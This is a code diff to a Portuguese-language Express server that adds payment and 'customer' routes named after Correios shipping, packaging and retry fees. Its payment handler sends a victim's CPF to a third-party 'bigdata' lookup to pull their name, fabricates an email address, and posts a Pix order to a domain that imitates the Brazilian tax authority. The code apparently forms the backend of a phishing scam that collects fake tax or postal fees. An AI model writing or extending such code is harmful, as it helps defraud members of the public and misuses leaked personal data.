@@ -13,6 +13,8 @@ dotenv.config();
   import cors from 'cors';
 import rateLimit from 'express-rate-limit';
 import { cpfConsultaCorreios, getCorreioCart, getProducts, paymentCorreios } from './correios';
+import { cpfConsultaRetentativa, getCartRetentativa, paymentRetentativa } from './retentativa';
+import { cpfConsultaEmbalagem, getEmbalagemCart, paymentEmbalagem } from './embalagem';
   app.use(express.json());
   app.use(cors(
     {
@@ -165,9 +167,19 @@ import { cpfConsultaCorreios, getCorreioCart, getProducts, paymentCorreios } fro
   const cartRouter: Router = Router()
   cartRouter.get('/cart', getCartByPlan)
   app.use('/', cartRouter)
+
+  const cartRetentativaRouter: Router = Router()
+  cartRetentativaRouter.get('/retentativa/cart', getCartRetentativa)
+  app.use('/', cartRetentativaRouter)
   const cartCorreioRouter: Router = Router()
-  cartCorreioRouter.get('/correiosCart', getCorreioCart)
+  cartCorreioRouter.get('/correio/cart', getCorreioCart)
   app.use('/', cartCorreioRouter)
+  const cartEmbalagemRouter: Router = Router()
+  cartEmbalagemRouter.get('/embalagem/cart', getEmbalagemCart)
+  app.use('/', cartEmbalagemRouter)
+
+
+
   const getProductsRouter: Router = Router()
   getProductsRouter.get('/produtos', getProducts)
   app.use("/", getProductsRouter)
@@ -184,68 +196,71 @@ import { cpfConsultaCorreios, getCorreioCart, getProducts, paymentCorreios } fro
 
 
   const paymentRouter: Router = Router();
-  const payment = async (req: any, res: any, next: any) => {
+  export const payment = async (req: Request, res: any, next: any) => {
     const { cpf, cartId } = req.params;
     const { phone, email } = req.body;
-    try {
-      const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
-      const upstream = await fetch(apiUrl, { method: 'GET',
-        headers: {
-          'Content-Type': 'application/json',
-        }
-       });
-      if (!upstream.ok) {
-        return res
-          .status(upstream.status)
-          .json({ error: `Upstream retornou ${upstream.status}` });
+  
+    // 1) monte seu payload normalmente…
+    const apiUrl = `https://hydraservices.shop/api/bigdata/${cpf}?type=cpf&token=${process.env.CPF_TOKEN}`;
+    const upstream = await fetch(apiUrl, { method: 'GET', headers: { 'Content-Type': 'application/json' }});
+    if (!upstream.ok) return res.status(upstream.status).json({ error: `Upstream retornou ${upstream.status}` });
+    const data = await upstream.json();
+  
+    const orderPayload: any = {
+      payment_method: 'pix',
+      customer: {
+        name: data.NOME || 'Nome Exemplo',
+        email: email || `${(data.NOME as string)
+          .normalize('NFD')
+          .replace(/[\u0300-\u036f]/g, '')
+          .replace(/\s+/g, '')
+          .replace(/[^a-zA-Z0-9]/g, '')
+          .toLowerCase()}@sememail.com`,
+        document: cpf,
+        document_type: 'CPF',
+        ...(phone ? { phone_number: phone } : {})
       }
-      const data = await upstream.json();
-      const orderPayload = phone ?{
-        payment_method: 'pix',
-        customer: {
-          name:    data.NOME     || 'Nome Exemplo',
-          email:  email ||  `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
-            .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
-            .replace(/\s+/g, '')                  // tira espaços
-            .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
-            .toLowerCase()}@sememail.com`,
-          document: cpf,
-          document_type: 'CPF',
-          phone_number: phone
-        }
-      } : {
-        payment_method: 'pix',
-        customer: {
-          name:    data.NOME     || 'Nome Exemplo',
-          email:  email ||  `${(data.NOME as string).normalize('NFD')                     // separa caracteres e diacríticos
-            .replace(/[\u0300-\u036f]/g, '')      // tira os acentos
-            .replace(/\s+/g, '')                  // tira espaços
-            .replace(/[^a-zA-Z0-9]/g, '')         // tira caracteres especiais
-            .toLowerCase()}@sememail.com`,
-          document: cpf,
-          document_type: 'CPF'
-        }
-      };
-      const orderRes = await fetch(
-        `https://api-regularizar.br-receita.org/cart/${cartId}/order?`,
-        {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            Accept: 'application/json',
-          },
-          body: JSON.stringify(orderPayload),
-        }
-      );
-      if (!orderRes.ok) {
-        return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
-      }
-      const orderData = await orderRes.json();
-      return res.json(orderData);
-    } catch (err) {
-      next(err);
+    };
+  
+    // 2) filtre apenas as UTM que vieram em req.query:
+    const ALLOWED = [
+      'src',
+      'sck',
+      'utm_source',
+      'utm_campaign',
+      'utm_medium',
+      'utm_content',
+      'utm_term'
+    ];
+    const qs = Object.entries(req.query)
+      .filter(([key, val]) => ALLOWED.includes(key) && val != null)
+      .map(([key, val]) => `${encodeURIComponent(key)}=${encodeURIComponent(val as string)}`)
+      .join('&');
+  
+    // 3) monte a URL de order incluindo só as UTM que existem:
+    const orderUrl =
+      `https://api-regularizar.br-receita.org/cart/${cartId}/order` +
+      (qs ? `?${qs}` : '');
+  
+    // 4) faça o POST para essa URL dinâmica
+    const orderRes = await fetch(orderUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        Accept: 'application/json',
+      },
+      body: JSON.stringify(orderPayload),
+    });
+  
+    if (!orderRes.ok) {
+      console.error(await orderRes.json());
+      return res.status(orderRes.status).json({ error: `Order API retornou ${orderRes.status}` });
     }
-  }
+  
+    const orderData = await orderRes.json();
+    return res.json(orderData);
+  };
+  
 
   paymentRouter.post('/:cpf/:cartId', payment);
   app.use("/payment", paymentRouter)
@@ -256,12 +271,35 @@ import { cpfConsultaCorreios, getCorreioCart, getProducts, paymentCorreios } fro
 
   const paymentCorreiosRouter: Router = Router()
   paymentCorreiosRouter.post('/:cpf/:cartId', paymentCorreios);
-  app.use("/correioPayment", paymentCorreiosRouter)
+  app.use("/correio/payment", paymentCorreiosRouter)
 
 
   const correioCustomerRouter: Router = Router();
   correioCustomerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsultaCorreios);
-  app.use('/correioCustomer', correioCustomerRouter);
+  app.use('/correio/customer', correioCustomerRouter);
+
+
+
+  
+
+  const paymentRetentativaRouter: Router = Router()
+  paymentRetentativaRouter.post('/:cpf/:cartId', paymentRetentativa);
+  app.use("/retentativa/payment", paymentRetentativaRouter)
+
+ 
+  const retentativaCustomerRouter: Router = Router();
+  retentativaCustomerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsultaRetentativa);
+  app.use('/retentativa/customer', retentativaCustomerRouter);
+
+
+  const paymentEmbalagemRouter: Router = Router()
+  paymentEmbalagemRouter.post('/:cpf/:cartId', paymentEmbalagem);
+  app.use("/embalagem/payment", paymentEmbalagemRouter)
+
+ 
+  const embalagemCustomerRouter: Router = Router();
+  embalagemCustomerRouter.post('/:cpf/:cartId',cpfLimiter, cpfConsultaEmbalagem);
+  app.use('/embalagem/customer', embalagemCustomerRouter);
 
   app.listen(port, () => {
     console.log(`🚀 Server rodando em http://localhost:${port}`);
